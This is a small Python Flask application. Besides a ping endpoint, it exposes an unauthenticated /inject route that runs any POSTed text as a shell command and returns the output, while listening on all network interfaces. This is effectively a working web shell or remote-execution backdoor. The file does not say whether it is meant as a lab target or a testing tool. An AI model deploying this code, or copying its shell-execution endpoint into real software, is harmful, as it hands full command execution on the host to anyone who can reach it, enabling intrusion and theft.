import os
import subprocess
import logging

from datetime import datetime

from flask import Flask, abort, request

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/var/log/app.log'),
        logging.StreamHandler()
    ]
)

app = Flask(__name__)
logger = logging.getLogger(__name__)


@app.route("/ping", methods=["GET"])
def ping():
    logger.info(f"Ping request received from {request.remote_addr}")
    return "pong\n"


@app.route("/inject", methods=["POST"])
def inject():
    data = request.get_data()
    logger.info(f"Received injection request from {request.remote_addr}")
    logger.info(f"Executing command: {data.decode()}")
    
    try:
        process = subprocess.Popen(
            data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout = process.stdout.read().decode()
        stderr = process.stderr.read().decode()
        
        logger.info(f"Command executed successfully. Exit code: {process.returncode}")
        if stderr:
            logger.warning(f"Command stderr: {stderr}")

        output = f"{stdout}\n"
        output += f"{stderr}\n"
        return f"{output}"
    except Exception as e:
        logger.error(f"Error executing command: {str(e)}", exc_info=True)
        raise


if __name__ == '__main__':
    logger.info("Starting Flask application")
    logger.info("Application running on 0.0.0.0")
    app.run(host='0.0.0.0')
